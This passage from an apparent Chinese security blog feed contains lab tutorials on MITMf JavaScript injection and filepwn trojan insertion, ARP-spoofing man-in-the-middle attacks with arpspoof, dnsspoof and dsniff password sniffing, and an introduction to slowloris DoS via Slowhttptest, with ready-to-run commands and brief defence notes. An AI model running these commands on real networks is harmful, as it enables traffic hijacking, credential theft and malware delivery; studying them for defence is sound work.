<h3 id="3-启动靶机访问任意页面，可以看到js-已经注入到页面当中，玩过beef的都知道它的强大，但是笔者的beef出了点问题，就不给大家演示了，有兴趣的可以自己去搜一下"><a href="#3-启动靶机访问任意页面，可以看到js-已经注入到页面当中，玩过beef的都知道它的强大，但是笔者的beef出了点问题，就不给大家演示了，有兴趣的可以自己去搜一下" class="headerlink" title="3. 启动靶机访问任意页面，可以看到js 已经注入到页面当中，玩过beef的都知道它的强大，但是笔者的beef出了点问题，就不给大家演示了，有兴趣的可以自己去搜一下"></a>3. 启动靶机访问任意页面，可以看到js 已经注入到页面当中，玩过beef的都知道它的强大，但是笔者的beef出了点问题，就不给大家演示了，有兴趣的可以自己去搜一下</h3><p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/6FD54CD991C341BF82D6B8AEBB86425D/2648" alt="image"></p>
<hr>
<h2 id="0x04-filepwn模块"><a href="#0x04-filepwn模块" class="headerlink" title="0x04. --filepwn模块"></a>0x04. <strong>-</strong>-filepwn模块</h2><h3 id="1-启动msf，加载msgrpc模块"><a href="#1-启动msf，加载msgrpc模块" class="headerlink" title="1. 启动msf，加载msgrpc模块"></a>1. 启动msf，加载msgrpc模块</h3><blockquote>
<p>service postgresql start &amp;&amp; msfconsole</p>
<p>load msgrpc</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/541CEE320BAC44CABAAA1EB69002EDC9/2661" alt="image"></p>
<h3 id="2-改写配置文件"><a href="#2-改写配置文件" class="headerlink" title="2. 改写配置文件"></a>2. 改写配置文件</h3><blockquote>
<p>gedit /usr/share/mitmf/config/mitmf.conf</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/C0188D9FB7E44C70987E2150C2725D5A/2666" alt="image"></p>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/319EF71A78BF44D28BE76DB169073226/2673" alt="image"></p>
<h3 id="3-启动mitmf，开启filepwn-之后msf会自动加载几个exp进行侦听"><a href="#3-启动mitmf，开启filepwn-之后msf会自动加载几个exp进行侦听" class="headerlink" title="3. 启动mitmf，开启filepwn,之后msf会自动加载几个exp进行侦听"></a>3. 启动mitmf，开启filepwn,之后msf会自动加载几个exp进行侦听</h3><blockquote>
<p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; mitmf <strong>-</strong>-spoof –arp -i eth0 <strong>-</strong>-gateway 192.168.1.1 <strong>-</strong>-target 192.168.1.106 <strong>-</strong>-filepwn</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/AA2890664C1943EB999402A041B24051/2696" alt="image"></p>
<h3 id="4-filepwn的原理就是在靶机下载可执行程序时将木马插入程序里，执行程序时就会启动木马，所以接下来我用靶机下载一个putty程序"><a href="#4-filepwn的原理就是在靶机下载可执行程序时将木马插入程序里，执行程序时就会启动木马，所以接下来我用靶机下载一个putty程序" class="headerlink" title="4. filepwn的原理就是在靶机下载可执行程序时将木马插入程序里，执行程序时就会启动木马，所以接下来我用靶机下载一个putty程序"></a>4. filepwn的原理就是在靶机下载可执行程序时将木马插入程序里，执行程序时就会启动木马，所以接下来我用靶机下载一个putty程序</h3><p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/D3F3F5BBFC4542C6987C331989E39E5C/2699" alt="image"></p>
<h3 id="5-之后正常情况下msf应该就能接收到木马的连接，但是不知道是笔者环境出了问题还是姿势不对，msf老是报错，希望有经验的读者可以告诉我解决的办法，谢谢"><a href="#5-之后正常情况下msf应该就能接收到木马的连接，但是不知道是笔者环境出了问题还是姿势不对，msf老是报错，希望有经验的读者可以告诉我解决的办法，谢谢" class="headerlink" title="5. 之后正常情况下msf应该就能接收到木马的连接，但是不知道是笔者环境出了问题还是姿势不对，msf老是报错，希望有经验的读者可以告诉我解决的办法，谢谢"></a>5. 之后正常情况下msf应该就能接收到木马的连接，但是不知道是笔者环境出了问题还是姿势不对，msf老是报错，希望有经验的读者可以告诉我解决的办法，谢谢</h3><p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/E829CBB57EB74BE0AFE4CE80CCBDC83A/2701" alt="image"></p>
<hr>
<h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a>0x05. 结语</h2><h4 id="emsp-emsp-经常遇到玄学问题，可能还是由于自己比较菜，所以希望有大神看到我的文章之后能email-me，我们一起探讨玄学！"><a href="#emsp-emsp-经常遇到玄学问题，可能还是由于自己比较菜，所以希望有大神看到我的文章之后能email-me，我们一起探讨玄学！" class="headerlink" title="&emsp;&emsp;经常遇到玄学问题，可能还是由于自己比较菜，所以希望有大神看到我的文章之后能email me，我们一起探讨玄学！"></a>&emsp;&emsp;经常遇到玄学问题，可能还是由于自己比较菜，所以希望有大神看到我的文章之后能<a href="mailto:TimeS0ng@163.com" target="_blank" rel="external">email me</a>，我们一起探讨玄学！</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[无线渗透(序章)--中间人攻击]]></title>
      <url>/2017/10/02/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F-%E5%BA%8F%E7%AB%A0-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
      <content type="html"><![CDATA[<h2 id="0x00-MITM简介"><a href="#0x00-MITM简介" class="headerlink" title="0x00. MITM简介"></a>0x00. MITM简介</h2><h4 id="emsp-emsp-中间人攻击-MITM-是一种由来已久的攻击手段，简单点说也就是截获你的流量，然后篡改或者嗅探流量，而且就算是老成的网络“高手”也不一定能发现自己中招了，接下来就由笔者给大家逐一介绍其中的攻击原理和防御手段。"><a href="#emsp-emsp-中间人攻击-MITM-是一种由来已久的攻击手段，简单点说也就是截获你的流量，然后篡改或者嗅探流量，而且就算是老成的网络“高手”也不一定能发现自己中招了，接下来就由笔者给大家逐一介绍其中的攻击原理和防御手段。" class="headerlink" title="&emsp;&emsp;中间人攻击(MITM)是一种由来已久的攻击手段，简单点说也就是截获你的流量，然后篡改或者嗅探流量，而且就算是老成的网络“高手”也不一定能发现自己中招了，接下来就由笔者给大家逐一介绍其中的攻击原理和防御手段。"></a>&emsp;&emsp;中间人攻击(MITM)是一种由来已久的攻击手段，简单点说也就是截获你的流量，然后篡改或者嗅探流量，而且就算是老成的网络“高手”也不一定能发现自己中招了，接下来就由笔者给大家逐一介绍其中的攻击原理和防御手段。</h4><a id="more"></a>
<hr>
<h2 id="0x01-ARP协议分析"><a href="#0x01-ARP协议分析" class="headerlink" title="0x01. ARP协议分析"></a>0x01. ARP协议分析</h2><h4 id="emsp-emsp-ARP即地址解析协议，数据包在以太网中传输时需要有两个地址，一个是IP地址，另一个就是MAC地址。其中的IP地址只是用来进行逻辑寻址的，以太网并不能通过IP地址进行通信，因为IP地址是可以变换的，基于IP的通信不可靠也不安全，所以在以太网中主要是靠MAC地址进行物理通信，因为电脑的MAC地址在出产时就已经设定好，一般不会改变，而ARP协议就是用来帮助主机获取目标主机的MAC地址！"><a href="#emsp-emsp-ARP即地址解析协议，数据包在以太网中传输时需要有两个地址，一个是IP地址，另一个就是MAC地址。其中的IP地址只是用来进行逻辑寻址的，以太网并不能通过IP地址进行通信，因为IP地址是可以变换的，基于IP的通信不可靠也不安全，所以在以太网中主要是靠MAC地址进行物理通信，因为电脑的MAC地址在出产时就已经设定好，一般不会改变，而ARP协议就是用来帮助主机获取目标主机的MAC地址！" class="headerlink" title="&emsp;&emsp;ARP即地址解析协议，数据包在以太网中传输时需要有两个地址，一个是IP地址，另一个就是MAC地址。其中的IP地址只是用来进行逻辑寻址的，以太网并不能通过IP地址进行通信，因为IP地址是可以变换的，基于IP的通信不可靠也不安全，所以在以太网中主要是靠MAC地址进行物理通信，因为电脑的MAC地址在出产时就已经设定好，一般不会改变，而ARP协议就是用来帮助主机获取目标主机的MAC地址！"></a>&emsp;&emsp;ARP即地址解析协议，数据包在以太网中传输时需要有两个地址，一个是IP地址，另一个就是MAC地址。其中的IP地址只是用来进行逻辑寻址的，以太网并不能通过IP地址进行通信，因为IP地址是可以变换的，基于IP的通信不可靠也不安全，所以在以太网中主要是靠MAC地址进行物理通信，因为电脑的MAC地址在出产时就已经设定好，一般不会改变，而ARP协议就是用来帮助主机获取目标主机的MAC地址！</h4><h2 id="ARP通信过程："><a href="#ARP通信过程：" class="headerlink" title="ARP通信过程："></a>ARP通信过程：</h2><h4 id="1-首先，每台主机都会在自己的ARP缓冲区建立一个ARP列表，用于表示IP地址和MAC地址的对应关系"><a href="#1-首先，每台主机都会在自己的ARP缓冲区建立一个ARP列表，用于表示IP地址和MAC地址的对应关系" class="headerlink" title="1. 首先，每台主机都会在自己的ARP缓冲区建立一个ARP列表，用于表示IP地址和MAC地址的对应关系"></a>1. 首先，每台主机都会在自己的ARP缓冲区建立一个ARP列表，用于表示IP地址和MAC地址的对应关系</h4><h4 id="2-当源主机需要向目标主机发送数据包时，会先检查自己的ARP缓冲区是否有该IP对应的MAC地址，如果有就直接发送数据包到该MAC地址；如果没有那么源主机就会在本网段发ARP广播包，查询目标主机的IP对应的MAC地址（注：这里只讨论局域网环境）"><a href="#2-当源主机需要向目标主机发送数据包时，会先检查自己的ARP缓冲区是否有该IP对应的MAC地址，如果有就直接发送数据包到该MAC地址；如果没有那么源主机就会在本网段发ARP广播包，查询目标主机的IP对应的MAC地址（注：这里只讨论局域网环境）" class="headerlink" title="2. 当源主机需要向目标主机发送数据包时，会先检查自己的ARP缓冲区是否有该IP对应的MAC地址，如果有就直接发送数据包到该MAC地址；如果没有那么源主机就会在本网段发ARP广播包，查询目标主机的IP对应的MAC地址（注：这里只讨论局域网环境）"></a>2. 当源主机需要向目标主机发送数据包时，会先检查自己的ARP缓冲区是否有该IP对应的MAC地址，如果有就直接发送数据包到该MAC地址；如果没有那么源主机就会在本网段发ARP广播包，查询目标主机的IP对应的MAC地址（注：这里只讨论局域网环境）</h4><h4 id="3-接收到ARP广播包的主机会检查数据包中的目的IP地址和自己的IP地址是否一致，如果不同则丢弃数据包；如果相同那么目标主机会先将数据包中的IP-MAC对应关系缓存到自己的ARP列表中，并且会覆盖原本属于这个IP对应的MAC（注：这是中间人攻击的关键），然后给源主机发送一个-ARP响应数据包，告诉对方自己是它需要查找的MAC地址"><a href="#3-接收到ARP广播包的主机会检查数据包中的目的IP地址和自己的IP地址是否一致，如果不同则丢弃数据包；如果相同那么目标主机会先将数据包中的IP-MAC对应关系缓存到自己的ARP列表中，并且会覆盖原本属于这个IP对应的MAC（注：这是中间人攻击的关键），然后给源主机发送一个-ARP响应数据包，告诉对方自己是它需要查找的MAC地址" class="headerlink" title="3. 接收到ARP广播包的主机会检查数据包中的目的IP地址和自己的IP地址是否一致，如果不同则丢弃数据包；如果相同那么目标主机会先将数据包中的IP/MAC对应关系缓存到自己的ARP列表中，并且会覆盖原本属于这个IP对应的MAC（注：这是中间人攻击的关键），然后给源主机发送一个 ARP响应数据包，告诉对方自己是它需要查找的MAC地址"></a>3. 接收到ARP广播包的主机会检查数据包中的目的IP地址和自己的IP地址是否一致，如果不同则丢弃数据包；如果相同那么目标主机会先将数据包中的IP/MAC对应关系缓存到自己的ARP列表中，并且会覆盖原本属于这个IP对应的MAC（注：这是中间人攻击的关键），然后给源主机发送一个 ARP响应数据包，告诉对方自己是它需要查找的MAC地址</h4><h4 id="4-源主机收到这个ARP响应数据包后，将得到的目的主机的IP地址和MAC地址添加到自己的ARP列表中，并利用此信息开始数据的传输。"><a href="#4-源主机收到这个ARP响应数据包后，将得到的目的主机的IP地址和MAC地址添加到自己的ARP列表中，并利用此信息开始数据的传输。" class="headerlink" title="4. 源主机收到这个ARP响应数据包后，将得到的目的主机的IP地址和MAC地址添加到自己的ARP列表中，并利用此信息开始数据的传输。"></a>4. 源主机收到这个ARP响应数据包后，将得到的目的主机的IP地址和MAC地址添加到自己的ARP列表中，并利用此信息开始数据的传输。</h4><hr>
<h2 id="0x02-ARP劫持原理"><a href="#0x02-ARP劫持原理" class="headerlink" title="0x02. ARP劫持原理"></a>0x02. ARP劫持原理</h2><p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/WEBRESOURCEb7f818f776d09e9d0e00809840cb7713/2403" alt="image"></p>
<h3 id="emsp-emsp-如上图所示，中间人攻击也就是将原本正常client-lt-——-gt-server之间的通信劫持下来变成client-lt-——-gt-attacker-lt-——-gt-server-让客户端和服务端的流量都从attacker的电脑经过，此时的attacker就可以侦听流经本机的流量并进行篡改和嗅探。下面介绍如何让attacker成为中间人。"><a href="#emsp-emsp-如上图所示，中间人攻击也就是将原本正常client-lt-——-gt-server之间的通信劫持下来变成client-lt-——-gt-attacker-lt-——-gt-server-让客户端和服务端的流量都从attacker的电脑经过，此时的attacker就可以侦听流经本机的流量并进行篡改和嗅探。下面介绍如何让attacker成为中间人。" class="headerlink" title="&emsp;&emsp;如上图所示，中间人攻击也就是将原本正常client&lt;——&gt;server之间的通信劫持下来变成client&lt;——&gt;attacker&lt;——&gt;server,让客户端和服务端的流量都从attacker的电脑经过，此时的attacker就可以侦听流经本机的流量并进行篡改和嗅探。下面介绍如何让attacker成为中间人。"></a>&emsp;&emsp;如上图所示，中间人攻击也就是将原本正常client&lt;——&gt;server之间的通信劫持下来变成client&lt;——&gt;attacker&lt;——&gt;server,让客户端和服务端的流量都从attacker的电脑经过，此时的attacker就可以侦听流经本机的流量并进行篡改和嗅探。下面介绍如何让attacker成为中间人。</h3><h3 id="MITM原理"><a href="#MITM原理" class="headerlink" title="MITM原理"></a>MITM原理</h3><h4 id="1-一开始笔者就介绍了ARP协议的通信原理，之所以这么做是想让大家对协议有更深入的理解，然后更好的弄清楚中间人的本质，这样才知道如何防御"><a href="#1-一开始笔者就介绍了ARP协议的通信原理，之所以这么做是想让大家对协议有更深入的理解，然后更好的弄清楚中间人的本质，这样才知道如何防御" class="headerlink" title="1. 一开始笔者就介绍了ARP协议的通信原理，之所以这么做是想让大家对协议有更深入的理解，然后更好的弄清楚中间人的本质，这样才知道如何防御"></a>1. 一开始笔者就介绍了ARP协议的通信原理，之所以这么做是想让大家对协议有更深入的理解，然后更好的弄清楚中间人的本质，这样才知道如何防御</h4><h4 id="2-其实电脑是很笨的，它并不能向人类那样灵敏的思考，就好比我们直接给client发送一个ARP数据包声称：我的MAC对应的IP就是网关IP，以后把你的的数据包发给我让我帮你转发吧，然后client想都不想就会相信，而且也不理会自己是否发送了ARP广播包"><a href="#2-其实电脑是很笨的，它并不能向人类那样灵敏的思考，就好比我们直接给client发送一个ARP数据包声称：我的MAC对应的IP就是网关IP，以后把你的的数据包发给我让我帮你转发吧，然后client想都不想就会相信，而且也不理会自己是否发送了ARP广播包" class="headerlink" title="2. 其实电脑是很笨的，它并不能向人类那样灵敏的思考，就好比我们直接给client发送一个ARP数据包声称：我的MAC对应的IP就是网关IP，以后把你的的数据包发给我让我帮你转发吧，然后client想都不想就会相信，而且也不理会自己是否发送了ARP广播包"></a>2. 其实电脑是很笨的，它并不能向人类那样灵敏的思考，就好比我们直接给client发送一个ARP数据包声称：我的MAC对应的IP就是网关IP，以后把你的的数据包发给我让我帮你转发吧，然后client想都不想就会相信，而且也不理会自己是否发送了ARP广播包</h4><h4 id="3-欺骗网关时也是一样的，那么之后的通信就会成为client-lt-——-gt-attacker-lt-——-gt-gateway"><a href="#3-欺骗网关时也是一样的，那么之后的通信就会成为client-lt-——-gt-attacker-lt-——-gt-gateway" class="headerlink" title="3. 欺骗网关时也是一样的，那么之后的通信就会成为client&lt;——&gt;attacker&lt;——&gt;gateway"></a>3. 欺骗网关时也是一样的，那么之后的通信就会成为client&lt;——&gt;attacker&lt;——&gt;gateway</h4><hr>
<h2 id="0x03-MITM攻击实战"><a href="#0x03-MITM攻击实战" class="headerlink" title="0x03. MITM攻击实战"></a>0x03. MITM攻击实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="1-kali-Linux"><a href="#1-kali-Linux" class="headerlink" title="1. kali Linux"></a>1. kali Linux</h4><h4 id="2-win-7靶机-emsp-IP-192-168-1-106"><a href="#2-win-7靶机-emsp-IP-192-168-1-106" class="headerlink" title="2. win 7靶机 &emsp;IP=192.168.1.106"></a>2. win 7靶机 &emsp;IP=192.168.1.106</h4><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><h3 id="1-启动kali的流量转发功能，然后启动arpspoof对靶机和网关进行双向欺骗，成为中间人"><a href="#1-启动kali的流量转发功能，然后启动arpspoof对靶机和网关进行双向欺骗，成为中间人" class="headerlink" title="1.启动kali的流量转发功能，然后启动arpspoof对靶机和网关进行双向欺骗，成为中间人"></a>1.启动kali的流量转发功能，然后启动arpspoof对靶机和网关进行双向欺骗，成为中间人</h3><blockquote>
<p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; arpspoof -t 192.168.1.106 -r 192.168.1.1</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/A7F2DA5A219F4EBA88794C9D67B0E289/2465" alt="image"><br><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/F579B7E009E74BD9A555D01FB3954A88/2471" alt="image"></p>
<h3 id="2-启动urlsnarf监听靶机访问的URL"><a href="#2-启动urlsnarf监听靶机访问的URL" class="headerlink" title="2. 启动urlsnarf监听靶机访问的URL"></a>2. 启动urlsnarf监听靶机访问的URL</h3><blockquote>
<p>urlsnarf -i eth0</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/5D2C165E0F644160A05F82FAB28BA6A9/2488" alt="image"></p>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/16CD22AE35964759A840DDA351D1303B/2489" alt="image"></p>
<h3 id="3-通过dnsspoof进行DNS欺骗（注：笔者使用这个工具时不太稳定，有时成功有时失败，但是大多数情况下都失败了，可能是我的靶机缓存有DNS记录，所以大家尽量选择没访问过的站点）"><a href="#3-通过dnsspoof进行DNS欺骗（注：笔者使用这个工具时不太稳定，有时成功有时失败，但是大多数情况下都失败了，可能是我的靶机缓存有DNS记录，所以大家尽量选择没访问过的站点）" class="headerlink" title="3. 通过dnsspoof进行DNS欺骗（注：笔者使用这个工具时不太稳定，有时成功有时失败，但是大多数情况下都失败了，可能是我的靶机缓存有DNS记录，所以大家尽量选择没访问过的站点）"></a>3. 通过dnsspoof进行DNS欺骗（注：笔者使用这个工具时不太稳定，有时成功有时失败，但是大多数情况下都失败了，可能是我的靶机缓存有DNS记录，所以大家尽量选择没访问过的站点）</h3><blockquote>
<p>echo “192.168.1.1 *.wmpic.me” &gt; dnsspoof.host &amp;&amp; dnsspoof -i eth0 -f dnsspoof.host</p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/D629EE7E17F44A9A803ACB69C033C84D/2508" alt="image"></p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/BA103D2F3E06414A9A43642A6D56F8DF/2523" alt="image"></p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/A1E52A5BCF1A431DBDA7328944F75AD7/2507" alt="image"></p>
<h3 id="4-通过dsniff嗅探密码"><a href="#4-通过dsniff嗅探密码" class="headerlink" title="4. 通过dsniff嗅探密码"></a>4. 通过dsniff嗅探密码</h3><p>dsniff -cm</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/2D8DEC9950A544348C5477C423AFBC5A/2530" alt="image"></p>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/8D9B375121464E8D831303CE165B76ED/2531" alt="image"></p>
<hr>
<h2 id="0x04-防御措施"><a href="#0x04-防御措施" class="headerlink" title="0x04. 防御措施"></a>0x04. 防御措施</h2><h4 id="emsp-emsp-关于中间人的利用就介绍到这里吧，大家可以自行Google一下其他的工具，下面介绍一下防御方法。基于ARP的中间人攻击只需要在网关上设置IP／MAC绑定就能杜绝了，其实原理很简单，这就是上面我给大家介绍ARP原理的原因。"><a href="#emsp-emsp-关于中间人的利用就介绍到这里吧，大家可以自行Google一下其他的工具，下面介绍一下防御方法。基于ARP的中间人攻击只需要在网关上设置IP／MAC绑定就能杜绝了，其实原理很简单，这就是上面我给大家介绍ARP原理的原因。" class="headerlink" title="&emsp;&emsp;关于中间人的利用就介绍到这里吧，大家可以自行Google一下其他的工具，下面介绍一下防御方法。基于ARP的中间人攻击只需要在网关上设置IP／MAC绑定就能杜绝了，其实原理很简单，这就是上面我给大家介绍ARP原理的原因。"></a>&emsp;&emsp;关于中间人的利用就介绍到这里吧，大家可以自行Google一下其他的工具，下面介绍一下防御方法。基于ARP的中间人攻击只需要在网关上设置IP／MAC绑定就能杜绝了，其实原理很简单，这就是上面我给大家介绍ARP原理的原因。</h4><p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/B93990F9060945D6A979792AFE2BFB69/2542" alt="image"></p>
<hr>
<h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a>0x05. 结语</h2><h4 id="emsp-emsp-祝大家国庆快乐！！"><a href="#emsp-emsp-祝大家国庆快乐！！" class="headerlink" title="&emsp;&emsp;祝大家国庆快乐！！"></a>&emsp;&emsp;祝大家国庆快乐！！</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Slowhttptest]]></title>
      <url>/2017/09/29/Slowhttptest/</url>
      <content type="html"><![CDATA[<h2 id="0x00-Slowhttptest简介"><a href="#0x00-Slowhttptest简介" class="headerlink" title="0x00. Slowhttptest简介"></a>0x00. Slowhttptest简介</h2><h4 id="emsp-emsp-Slowhttptest其实是一个DoS压力测试工具，它集成有三种慢速攻击模式-slowloris、slow-http-post、slow-read-attack），并且能导出日志报告，节约了部分写文档的时间，是一个特别好用且强大的工具，下面笔者将逐个分析它主要的攻击模式及防御方法。"><a href="#emsp-emsp-Slowhttptest其实是一个DoS压力测试工具，它集成有三种慢速攻击模式-slowloris、slow-http-post、slow-read-attack），并且能导出日志报告，节约了部分写文档的时间，是一个特别好用且强大的工具，下面笔者将逐个分析它主要的攻击模式及防御方法。" class="headerlink" title="&emsp;&emsp;Slowhttptest其实是一个DoS压力测试工具，它集成有三种慢速攻击模式(slowloris、slow http post、slow read attack），并且能导出日志报告，节约了部分写文档的时间，是一个特别好用且强大的工具，下面笔者将逐个分析它主要的攻击模式及防御方法。"></a>&emsp;&emsp;Slowhttptest其实是一个DoS压力测试工具，它集成有三种慢速攻击模式(slowloris、slow http post、slow read attack），并且能导出日志报告，节约了部分写文档的时间，是一个特别好用且强大的工具，下面笔者将逐个分析它主要的攻击模式及防御方法。</h4><a id="more"></a>
<hr>
<h2 id="0x01-Slowhttptest安装"><a href="#0x01-Slowhttptest安装" class="headerlink" title="0x01. Slowhttptest安装"></a>0x01. Slowhttptest安装</h2><h3 id="1-Mac安装命令"><a href="#1-Mac安装命令" class="headerlink" title="1. Mac安装命令"></a>1. Mac安装命令</h3><blockquote>
<p>brew update &amp;&amp; brew install slowhttptest</p>
</blockquote>
<h3 id="2-linux安装命令"><a href="#2-linux安装命令" class="headerlink" title="2.linux安装命令"></a>2.linux安装命令</h3><blockquote>
<p>apt-get update &amp;&amp; apt-get install slowhttptest</p>
</blockquote>
<h3 id="安装好Slowhttptest之后可以直接执行命令-Slowhttptest-检测是否成功安装-下面截图是笔者Mac上装的Slowhttptest。大家也可以利用GitHub安装，有兴趣的可以自己研究"><a href="#安装好Slowhttptest之后可以直接执行命令-Slowhttptest-检测是否成功安装-下面截图是笔者Mac上装的Slowhttptest。大家也可以利用GitHub安装，有兴趣的可以自己研究" class="headerlink" title="[*]安装好Slowhttptest之后可以直接执行命令 Slowhttptest 检测是否成功安装,下面截图是笔者Mac上装的Slowhttptest。大家也可以利用GitHub安装，有兴趣的可以自己研究"></a>[*]安装好Slowhttptest之后可以直接执行命令 Slowhttptest 检测是否成功安装,下面截图是笔者Mac上装的Slowhttptest。大家也可以利用GitHub安装，有兴趣的可以自己研究</h3><blockquote>
<p>git clone <a href="https://github.com/shekyan/slowhttptest" target="_blank" rel="external">https://github.com/shekyan/slowhttptest</a></p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/B1E7D4EE813A432CA0E8C10F5BBA6B83/1993" alt="image"></p>
<hr>
<h1 id="0x02-Slowloris模式"><a href="#0x02-Slowloris模式" class="headerlink" title="0x02. Slowloris模式"></a>0x02. Slowloris模式</h1><h2 id="Slowloris攻击原理："><a href="#Slowloris攻击原理：" class="headerlink" title="Slowloris攻击原理："></a><strong>Slowloris</strong>攻击原理：</h2><h4 id="1-Slowloris也称为slow-headers，是通过耗尽server的并发连接池来达到攻击目的的一种DoS攻击方式，这和前面讲的Syn-Flood有点相似，不过Slowloris是应用层的攻击"><a href="#1-Slowloris也称为slow-headers，是通过耗尽server的并发连接池来达到攻击目的的一种DoS攻击方式，这和前面讲的Syn-Flood有点相似，不过Slowloris是应用层的攻击" class="headerlink" title="1. Slowloris也称为slow headers，是通过耗尽server的并发连接池来达到攻击目的的一种DoS攻击方式，这和前面讲的Syn-Flood有点相似，不过Slowloris是应用层的攻击"></a>1. Slowloris也称为slow headers，是通过耗尽server的并发连接池来达到攻击目的的一种DoS攻击方式，这和前面讲的Syn-Flood有点相似，不过Slowloris是应用层的攻击</h4><h4 id="2-正常情况下当client和server通信时，client发送的header请求头信息的结尾应该是”0d0a0d0a”。但是如果启用Slowloris这种模式则只会发送”0d0a”，而HTTP协议默认在服务器接收到全部信息之后才会开始处理，如果始终没有接收到完整的request信息那么服务器会为其保留连接池并持续等待后续信息直到连接超时"><a href="#2-正常情况下当client和server通信时，client发送的header请求头信息的结尾应该是”0d0a0d0a”。但是如果启用Slowloris这种模式则只会发送”0d0a”，而HTTP协议默认在服务器接收到全部信息之后才会开始处理，如果始终没有接收到完整的request信息那么服务器会为其保留连接池并持续等待后续信息直到连接超时" class="headerlink" title="2. 正常情况下当client和server通信时，client发送的header请求头信息的结尾应该是”0d0a0d0a”。但是如果启用Slowloris这种模式则只会发送”0d0a”，而HTTP协议默认在服务器接收到全部信息之后才会开始处理，如果始终没有接收到完整的request信息那么服务器会为其保留连接池并持续等待后续信息直到连接超时"></a>2. 正常情况下当client和server通信时，client发送的header请求头信息的结尾应该是”0d0a0d0a”。但是如果启用Slowloris这种模式则只会发送”0d0a”，而HTTP协议默认在服务器接收到全部信息之后才会开始处理，如果始终没有接收到完整的request信息那么服务器会为其保留连接池并持续等待后续信息直到连接超时</h4><h4 id="3-通常配置不太好的的服务器的并发连接池数并不多，当攻击者连续不间断的建立连接并占满server的连接池资源之后，server就不能为正常用户提供服务，达到DoS攻击效果"><a href="#3-通常配置不太好的的服务器的并发连接池数并不多，当攻击者连续不间断的建立连接并占满server的连接池资源之后，server就不能为正常用户提供服务，达到DoS攻击效果" class="headerlink" title="3. 通常配置不太好的的服务器的并发连接池数并不多，当攻击者连续不间断的建立连接并占满server的连接池资源之后，server就不能为正常用户提供服务，达到DoS攻击效果"></a>3. 通常配置不太好的的服务器的并发连接池数并不多，当攻击者连续不间断的建立连接并占满server的连接池资源之后，server就不能为正常用户提供服务，达到DoS攻击效果</h4><h3 id="如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，然后他还准备点其他东西，但是又一直不说要啥，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS"><a href="#如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，然后他还准备点其他东西，但是又一直不说要啥，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS" class="headerlink" title="[*]如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，然后他还准备点其他东西，但是又一直不说要啥，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS"></a>[*]如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，然后他还准备点其他东西，但是又一直不说要啥，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS</h3><hr>
